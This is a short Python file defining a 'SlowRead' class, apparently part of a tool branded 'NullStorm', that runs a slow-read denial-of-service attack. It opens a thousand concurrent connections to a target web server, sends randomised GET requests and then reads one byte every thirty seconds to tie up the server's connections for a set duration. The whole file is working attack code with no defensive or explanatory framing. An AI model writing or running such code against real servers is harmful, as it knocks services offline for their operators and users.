import asyncio
import random

class SlowRead:
    def __init__(self, target, port=80, connections=1000, duration=180):
        self.target = target
        self.port = port
        self.connections = connections
        self.duration = duration
        self.stopped = False

    async def _slow_read_one(self, conn_id):
        try:
            reader, writer = await asyncio.open_connection(self.target, self.port)
            request = (
                f"GET /?id={random.randint(1,999999999)} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"User-Agent: NullStorm/2.1\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            writer.write(request.encode())
            await writer.drain()
            while not self.stopped:
                data = await asyncio.wait_for(reader.read(1), timeout=30)
                if not data:
                    break
                await asyncio.sleep(30)
            writer.close()
            await writer.wait_closed()
        except:
            pass

    async def _launch(self):
        tasks = [asyncio.create_task(self._slow_read_one(i)) for i in range(self.connections)]
        await asyncio.sleep(self.duration)
        self.stopped = True
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)